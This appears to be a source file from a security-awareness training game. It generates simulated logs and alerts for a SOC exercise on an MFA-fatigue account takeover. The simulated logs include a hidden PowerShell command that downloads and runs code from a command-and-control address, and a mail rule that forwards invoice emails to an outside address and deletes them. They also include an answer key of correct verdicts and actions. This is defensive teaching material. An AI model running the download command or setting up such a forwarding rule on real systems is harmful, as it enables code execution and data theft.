// Day 2 logs. The story:
//   06:40  someone signs in as m.chen from 198.51.100.77 with the RIGHT password (idp: password OK)
//   06:41  ...then 26 MFA pushes to Mike's phone, all rejected or ignored
//   07:02  push #27: APPROVED (Mike, half asleep, tapped Approve to make it stop)
//   07:03  VPN session from 198.51.100.77 as m.chen; 07:06 an inbox rule forwards invoice emails out and deletes them
//   07:10  the session reads Sales client lists on FILE01
//   08:30  the real Mike logs on at his desk (WS-0131)
// Everyone else: normal password + MFA push from the office. Internet scanners as usual.
// Consequences: Monday's plugged-in USB backdoor beacons overnight until IT reimaged your PC;
// enabling the macro today makes your PC call 203.0.113.45; the QR phish leads to an MFA push on YOUR account.

import { T, logBuilder, finishLogs, backgroundNoise, STAFF } from '../../game/logkit.js';

export const DATE = { weekday: 'TUE', name: 'Tuesday', month: 'Oct', day: 20 };
export const ATTACKER_IP = '198.51.100.77';
export const C2 = '203.0.113.45';

export const IP_INFO = {
  '198.51.100.77': { where: 'Netherlands', owner: 'AS-SHADOWHOST (bulletproof hosting)', note: 'Rents servers to anyone, ignores abuse reports. Never seen here before today.', external: true },
  '203.0.113.45': { where: 'Moldova', owner: 'AS-KRANNET hosting', note: 'The USB stick\'s command-and-control (C2) server from Priya\'s email. Also sent the fake Northwind invoice.', external: true },
  '203.0.113.46': { where: 'Moldova', owner: 'AS-KRANNET hosting', note: 'Hosts halcyon-mfa.com (the QR-code phish). Next door to the C2 server.', external: true },
};

const idp = (b, t, user, ip, event, outcome, extra = {}, more = '') =>
  b.add(t, 'idp', 'okta', `eventType=${event} outcome=${outcome} user=${user}@halcyonmutual.com client_ip=${ip}${more}`, { user, ip, ...extra });

export function generateLogs({ nowMinutes = 24 * 60, carry = {}, macroAt = null, qrCredsAt = null } = {}) {
  const b = logBuilder(1020);
  const { r, add, ok } = b;

  // Monday's consequence: the USB backdoor on your PC beacons all night, until IT reimages it at 06:10.
  if (carry.d1UsbPlugged) {
    for (let tt = T(0, 2); tt < T(6, 10); tt += 300) {
      add(tt, 'fw01', 'proxy', `ALLOW tcp 10.0.4.142:${50000 + Math.floor(r() * 9000)} -> ${C2}:443 bytes_out=${900 + Math.floor(r() * 300)} bytes_in=${400 + Math.floor(r() * 200)} category=Uncategorized`, { ip: C2, attack: true, key: tt === T(0, 2) ? 'beacon' : undefined });
    }
  }

  // The attack: right password, then MFA fatigue.
  idp(b, T(6, 40, 55), 'm.chen', ATTACKER_IP, 'user.authentication.auth_via_password', 'SUCCESS', { attack: true, key: 'pw-ok' }, ' geo="Amsterdam, NL"');
  let t = T(6, 41, 2);
  for (let i = 0; i < 26; i++) {
    const reason = r() < 0.7 ? 'USER_REJECTED_PUSH' : 'PUSH_TIMEOUT';
    idp(b, t, 'm.chen', ATTACKER_IP, 'user.authentication.auth_via_mfa', 'FAILURE', { attack: true, key: i === 0 ? 'first-push' : undefined }, ` factor=push reason=${reason}`);
    t += 35 + Math.floor(r() * 20);
  }
  idp(b, T(7, 2, 13), 'm.chen', ATTACKER_IP, 'user.authentication.auth_via_mfa', 'SUCCESS', { attack: true, key: 'mfa-approved' }, ' factor=push reason=USER_APPROVED_PUSH');
  idp(b, T(7, 2, 14), 'm.chen', ATTACKER_IP, 'user.session.start', 'SUCCESS', { attack: true });
  add(T(7, 3, 2), 'vpn01', 'openvpn', `openvpn[1187]: ${ATTACKER_IP}:41730 [m.chen] Peer Connection Initiated with [AF_INET]${ATTACKER_IP}:41730`, { ip: ATTACKER_IP, user: 'm.chen', attack: true, key: 'vpn-up' });
  add(T(7, 6, 40), 'mail01', 'exchange-audit', `Cmdlet=New-InboxRule Mailbox=m.chen ClientIP=${ATTACKER_IP} Params=-Name "." -SubjectContainsWords "invoice","payment","wire" -ForwardTo m.chen.archive@proton.me -DeleteMessage $true`, { ip: ATTACKER_IP, user: 'm.chen', attack: true, key: 'inbox-rule' });
  ['Sales/clients_master.xlsx', 'Sales/pipeline.xlsx', 'Finance/AP/vendor_master.xlsx'].forEach((f, i) =>
    add(T(7, 10 + i * 2, 5), 'file01', 'smbd_audit', `m.chen|172.16.0.83|pread|ok|Shared/${f}`, { user: 'm.chen', ip: '172.16.0.83', attack: true, key: i === 2 ? 'vendor-file' : undefined }),
  );
  add(T(7, 18, 0), 'vpn01', 'openvpn', `openvpn[1187]: m.chen/${ATTACKER_IP}:41730 SIGTERM[soft,remote-exit] received, client-instance exiting`, { ip: ATTACKER_IP, user: 'm.chen', attack: true });

  // Normal mornings, now with MFA.
  const arrivals = [
    ['dana.k', T(6, 5)],
    ['priya.r', T(7, 35)],
    ['s.okafor', T(7, 58)],
    ['c.reyes', T(8, 4)],
    ['t.okoye', T(8, 16)],
    ['j.alvarez', T(8, 40)],
    ['m.chen', T(8, 30)],
  ];
  for (const [user, at] of arrivals) {
    const [, ip] = STAFF[user];
    idp(b, at - 20, user, ip, 'user.authentication.auth_via_mfa', 'SUCCESS', user === 'm.chen' ? { key: 'real-mike' } : {}, ' factor=push reason=USER_APPROVED_PUSH');
  }
  backgroundNoise(b, { arrivals });
  ok(T(6, 12, 0), 'analyst01', '10.0.4.142', 'WS-0142', 2);

  // Today's consequences.
  if (macroAt != null) {
    const at = macroAt * 60 + 9;
    b.proc(at, 'ws-0142', 'analyst01', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', `powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${C2}/a')"`, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', { attack: true, key: 'macro-ps' });
    add(at + 1, 'fw01', 'proxy', `ALLOW tcp 10.0.4.142:51877 -> ${C2}:80 bytes_out=312 bytes_in=48211 category=Uncategorized`, { ip: C2, attack: true });
  }
  if (qrCredsAt != null) {
    const at = (qrCredsAt + 2) * 60 + 31;
    idp(b, at, 'analyst01', '203.0.113.46', 'user.authentication.auth_via_password', 'SUCCESS', { attack: true, key: 'analyst01-pw' }, ' geo="Chisinau, MD"');
    idp(b, at + 4, 'analyst01', '203.0.113.46', 'user.authentication.auth_via_mfa', 'FAILURE', { attack: true }, ' factor=push reason=USER_REJECTED_PUSH');
  }

  return finishLogs(b.ev, { nowMinutes, date: DATE });
}

export const CASE = {
  id: 'case',
  area: 'SOC alert',
  title: "MFA fatigue on Mike Chen's account",
  max: 30,
  teaches: { skill: 'Recognize MFA fatigue (push bombing)', secplus: '2.4 Indicators of malicious activity: account compromise' },
  verdicts: [
    { id: 'accident', text: 'Mike approved one push by accident. No harm done.' },
    { id: 'fatigue', text: "MFA fatigue: the attacker already had Mike's password and spammed pushes until he approved. They got in and set up mail forwarding." },
    { id: 'glitch', text: 'The new MFA system glitched and sent duplicate pushes.' },
  ],
  correctVerdict: 'fatigue',
  wrongVerdictNotes: {
    accident: 'Not harmless: the approved session came from a Dutch hosting company and created an inbox rule that forwards invoices out.',
    glitch: 'Every push came from one outside IP that already had the right password (look for auth_via_password SUCCESS at 06:40).',
  },
  actions: [
    { id: 'revoke', text: "Revoke Mike's sessions and reset his password", good: true },
    { id: 'rule', text: 'Delete the forwarding inbox rule and check what it already sent out', good: true },
    { id: 'numbermatch', text: 'Switch MFA to number matching, so a blind "Approve" can\'t work', good: true },
    { id: 'block', text: `Block ${ATTACKER_IP} on the VPN and firewall`, good: true },
    { id: 'nomfa', text: "Turn MFA off for Mike, since it's bugging him", good: false, why: 'MFA did its job for 26 pushes. Removing it hands the attacker a password-only door.' },
    { id: 'shame', text: 'Email all staff about what Mike did', good: false, why: 'Blaming people in public teaches everyone to hide mistakes. You need them to report fast.' },
    { id: 'wait', text: 'Wait and see if it happens again', good: false, why: 'The attacker is already in, and the mail rule is quietly forwarding invoices right now.' },
  ],
  primaryEvidence: { key: 'mfa-approved', note: 'The key evidence is the approved push (USER_APPROVED_PUSH) from 198.51.100.77 at 07:02, after 26 failures.' },
  keyEvidence: ['pw-ok', 'mfa-approved', 'inbox-rule', 'vpn-up', 'real-mike', 'vendor-file'],
  containedRequires: ['revoke', 'rule'],
  costs: {
    contained: { amount: 5000, text: 'Reset Mike, clean the mailbox, review forwarded mail' },
    breach: { amount: 31000, text: 'The forwarding rule kept leaking invoices; a customer paid $31,000 to the attacker' },
  },
  perfectWhy: 'Exactly: right password, 26 rejected pushes, one tired "Approve", then a mail rule hiding invoice emails. Number matching stops this for good.',
  notSubmittedWhy: 'Nobody looked. The forwarding rule kept leaking invoice emails all week.',
};

export const ALERTS = [
  {
    id: 'mfa-fatigue-mchen',
    main: true,
    title: 'MFA push spam, then approval (m.chen)',
    severity: 'High',
    rule: 'More than 10 denied or ignored MFA pushes for one user within 30 minutes, followed by an approved push.',
    fields: [
      ['Account', 'm.chen'],
      ['Source IP', ATTACKER_IP],
      ['Denied pushes', '26'],
      ['Approved at', '07:02:13'],
      ['Location', 'Amsterdam, NL'],
    ],
    trigger: { after: 'tickets', delayMs: 2500, fallbackAt: 10 * 60 },
    notice: '🚨 SIEM alert (High): MFA push spam, then approval',
    chat: [
      'New alert: someone hit Mike Chen with 26 MFA pushes before he approved one. At 7 AM.',
      'Mike is at his desk. That was not him. Go to the SOC console and work out what they did once they got in.',
    ],
    case: CASE,
  },
  {
    id: 'macro-powershell',
    title: 'Office app launched PowerShell (WS-0142)',
    severity: 'High',
    rule: 'WINWORD.EXE started powershell.exe with a download command.',
    fields: [
      ['Host', "WS-0142 (that's your PC)"],
      ['Parent', 'WINWORD.EXE'],
      ['Contacted', C2],
    ],
    callout: 'You clicked "Enable Content" on that invoice. The macro started PowerShell and downloaded something from 203.0.113.45, the same server as the USB stick.',
    trigger: { when: (st) => st.mail['invoice-macro']?.macroEnabled && st.minutes >= (st.events.find((e) => e.type === 'macro-enabled')?.t ?? 0) + 1 },
    notice: '🚨 SIEM alert: Word launched PowerShell on your PC',
    chat: ['Hey! Your PC just ran PowerShell from a Word document and talked to 203.0.113.45. Did you enable macros on something?!', 'Dana is reimaging your PC tonight. Do not open anything else from that email.'],
  },
  {
    id: 'analyst01-mfa-push',
    title: 'Password OK, MFA denied: analyst01 from Moldova',
    severity: 'Medium',
    rule: 'Correct password from a new country, MFA push denied.',
    fields: [
      ['Account', "analyst01 (that's you)"],
      ['Source IP', '203.0.113.46'],
    ],
    callout: 'Someone has your password: you typed it into the "re-register your authenticator" page. MFA saved you this time, because you denied the push.',
    trigger: { when: (st) => st.phishedAt() != null && st.minutes >= st.phishedAt() + 3 },
    notice: '🚨 SIEM alert: your password was used from Moldova',
    chat: ['Your phone just got an MFA push you didn\'t ask for, right? Someone has your password. Deny it.', "That QR code email? That's how. I'm resetting your password."],
  },
];
